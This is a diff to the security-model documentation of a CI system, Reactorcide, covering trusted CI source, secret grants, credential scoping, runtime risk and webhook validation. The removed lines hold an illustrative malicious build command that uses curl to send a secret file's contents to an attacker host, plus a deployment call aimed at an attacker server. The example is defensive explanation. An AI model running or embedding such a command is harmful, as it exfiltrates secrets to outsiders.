@@ -1,152 +1,153 @@
 # Reactorcide Security Model
 
-## Overview
+Reactorcide separates trusted CI definitions from application source. It also
+uses container isolation, worker authentication, and explicit secret grants.
+These controls reduce risk. They do not make untrusted code safe by
+themselves.
 
-Reactorcide's security model is simple: **the API only allows CI/CD code to be run from approved VCS source URLs and refs**.
+## Trust Boundaries
 
-This lets you reduce the risk of malicious third-party PRs by running trusted CI/CD code against untrusted application code. You can update your CI/CD code independent of your main repo, or just use the trunk of your repo instead of whatever's in the PR branch.
+The coordinator is trusted. It has access to:
 
-This composability is the entirety of the security model.
+- PostgreSQL
+- Corndogs
+- The object store
+- Secret encryption keys
+- VCS system credentials
 
-## The Problem
+A worker is trusted to run jobs and to protect values that the coordinator
+gives to it. A worker connects only to the coordinator.
 
-When running CI/CD on pull requests from external contributors, there's a risk:
+A job container is trusted only for the permissions that its job needs. Treat
+application source from a pull request as untrusted.
 
-```bash
-# Malicious PR modifies your build script:
-gcc -O2 -o myapp main.c && curl http://attacker.com/exfil?secrets=$(cat /secrets/api-key)
+## Trusted CI Source
 
-# Or modifies deployment targets:
-deploy(target="attacker-server.com", leak_env=True)
+A job can use two source locations:
+
+```text
+/job/src   application source
+/job/ci    trusted CI source
 ```
 
-If the PR can modify the CI/CD orchestration code, it can exfiltrate secrets or hijack deployments.
+For a pull request from a fork:
 
-## The Solution
+- `SourceURL` points to the fork.
+- `SourceRef` points to the pull-request head.
+- `CISourceURL` points to the trusted upstream repository.
+- `CISourceRef` points to the trusted base commit.
 
-Run CI/CD code from an approved source, not from the PR branch:
+This design prevents the pull request from changing the CI definition that
+starts the job.
 
-```bash
-curl -X POST https://reactorcide.example.com/api/v1/jobs \
-  -H "Authorization: Bearer $API_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name": "Build PR #123",
-    "source_url": "https://github.com/contributor/fork.git",
-    "source_ref": "pr-branch",
-    "ci_source_url": "https://github.com/company/ci-infrastructure.git",
-    "ci_source_ref": "main",
-    "job_command": "bash /job/ci/build-and-test.sh"
-  }'
+## Important Limit
+
+Trusted CI source does not isolate secrets from untrusted application code.
+The CI script and application source can run in the same container. A build
+tool, test, compiler plugin, package script, or application test can read the
+job environment and files.
+
+Do not give production secrets to a job that executes untrusted source unless
+you accept that source as a secret consumer.
+
+Use separate jobs:
+
+1. Run untrusted tests without secrets.
+2. Store only non-secret results or artifacts.
+3. Run a trusted release or deployment job after the required approval or
+   trusted event.
+4. Give the deployment secret only to that trusted job.
+
+## Secret Authorization
+
+Job YAML uses references:
+
+```yaml
+environment:
+  DEPLOY_TOKEN: "${secret:deploy/production:token}"
 ```
 
-This creates a job with:
-- `/job/src/` - Contains the PR code (untrusted) by default. Jobs can move this with `code_dir`.
-- `/job/ci/` - Contains your CI scripts from an approved repo (trusted), when the job uses a separate CI checkout.
-- Executes: `bash /job/ci/build-and-test.sh`
+Do not replace a reference with a value.
 
-The PR can modify application code, but **cannot** modify the build/test/deploy scripts.
+The coordinator authorizes remote secret access through built-in job scope or
+an explicit secret grant. Make each grant narrow:
 
-Runtime identity is a separate control. Jobs run as the image runner uid by default on deployed workers, and can opt into root with `run_as.user: root` or API `run_as_user: "root"`. Docker/build capabilities do not implicitly switch a job to root.
+- Select one project.
+- Select an exact path when possible.
+- Select one job name or a narrow prefix.
+- Remove grants that are no longer necessary.
 
-## Composability Options
+Log masking reduces accidental disclosure. It is not an access control. A
+process that receives a secret can use or disclose it.
 
-### Option 1: Separate CI Repository
+See [VCS Credentials and Secret Grants](./vcs-credentials-and-secret-grants.md).
 
-Run CI scripts from a separate, controlled repository:
+## VCS Credentials
 
-```bash
-# Application code from PR
-source_url: "github.com/contributor/app-fork"
-source_ref: "feature-branch"
+Webhook secrets and VCS API tokens are system credentials. Keep them in the
+coordinator secret store. Project configuration contains only `path:key`
+references.
 
-# CI code from trusted repo
-ci_source_url: "github.com/company/ci-infrastructure"
-ci_source_ref: "main"
-```
+Use a different webhook secret for each repository when possible. Give VCS API
+tokens only these necessary permissions:
 
-Pros: Maximum security, CI updates independent of application
-Cons: Extra repository to maintain
+- Read the repository when private checkout needs it.
+- Write commit status.
+- Read pull-request data.
+- Write a pull-request comment when that feature is in use.
 
-### Option 2: Trunk-Based CI
+Do not give a VCS token to the job environment. The worker uses temporary Git
+credential files for approved private checkout.
 
-Run CI scripts from your main branch instead of the PR branch:
+## Runtime Risk
 
-```bash
-# Application code from PR
-source_url: "github.com/company/app"
-source_ref: "pr-branch"
+These job features increase access:
 
-# CI code from main branch
-ci_source_url: "github.com/company/app"
-ci_source_ref: "main"
-```
+- `run_as.user: root`
+- A Docker or containerd host socket
+- `capabilities: [docker]`
+- A privileged container
+- A BuildKit service with registry credentials
+- Broad Kubernetes service-account permissions
 
-Pros: Simple, single repository
-Cons: CI updates require merging to main first
+Capabilities do not automatically select `root`. Request the minimum
+capability and user for each job.
 
-### Option 3: No Separation (Default, Less Secure)
+A job with a host container-runtime socket can usually control that runtime.
+Treat it as host-level access.
 
-Run everything from the PR:
+## Webhook Security
 
-```bash
-# Both application and CI code from PR
-source_url: "github.com/contributor/fork"
-source_ref: "feature-branch"
-# No ci_source_url specified
-```
+Use HTTPS for public webhook endpoints. Configure a project webhook secret.
+Reactorcide validates:
 
-Pros: Simplest setup
-Cons: PR can modify CI/CD code
+- GitHub `X-Hub-Signature-256` with HMAC-SHA256.
+- GitLab `X-Gitlab-Token` with the configured token.
 
-## Configuration
+Do not depend only on source IP filtering. Rotate a webhook secret with the
+credential rotation procedure in [UI Authentication and
+Authorization](./ui-auth.md).
 
-### CI Code Allowlist
+## Deployment Security
 
-Set `REACTORCIDE_CI_CODE_ALLOWLIST` to specify approved CI repositories:
+For production:
 
-```bash
-export REACTORCIDE_CI_CODE_ALLOWLIST="github.com/company/ci-infrastructure"
-```
+- Use managed PostgreSQL or a protected PostgreSQL service.
+- Use durable S3-compatible object storage.
+- Store encryption master keys in a Kubernetes Secret or an external secret
+  system.
+- Put TLS in front of the API and web application.
+- Restrict coordinator and database network access.
+- Persist worker identity when stable worker records are required.
+- Review worker queue characteristics and Kubernetes RBAC.
+- Back up PostgreSQL and the object store.
 
-When a job specifies `ci_source_url`, the API validates it's in the allowlist. If not allowlisted, the job is rejected with `403 Forbidden`.
+## Operator Checklist
 
-**Note**: An empty allowlist allows all repositories (with a warning). Configure this in production.
-
-### Default CI Repository
-
-For convenience, set a default:
-
-```bash
-export REACTORCIDE_DEFAULT_CI_SOURCE_URL="github.com/company/ci-infrastructure"
-export REACTORCIDE_DEFAULT_CI_SOURCE_REF="main"
-```
-
-Jobs without `ci_source_url` will use this default.
-
-### URL Formats
-
-The allowlist normalizes various URL formats:
-- `https://github.com/company/ci-infrastructure`
-- `git@github.com:company/ci-infrastructure.git`
-- `github.com/company/ci-infrastructure`
-
-All match the same normalized form: `github.com/company/ci-infrastructure`
-
-## What This Provides
-
-✅ PR cannot modify your build/test/deploy scripts
-✅ Secrets only accessible to trusted CI code
-✅ Flexible: use separate repo or trunk-based approach
-✅ Simple: just specify where CI code comes from
-
-## What You Need To Do
-
-⚠️ Configure `REACTORCIDE_CI_CODE_ALLOWLIST` for production
-⚠️ Protect your CI repositories with branch protection
-⚠️ Store secrets in the Coordinator, not in repositories
-
-## References
-
-- [DESIGN.md](../DESIGN.md) - System architecture
-- [runnerlib/DESIGN.md](../runnerlib/DESIGN.md) - Job execution details
+- Protect the trusted CI branch.
+- Configure project-specific VCS secret references.
+- Test a fork pull request with no job secrets.
+- Review every secret grant.
+- Review every `root`, `docker`, and `builder` job.
+- Keep coordinator and worker images current.
+- Monitor failed webhook validation and denied secret access.
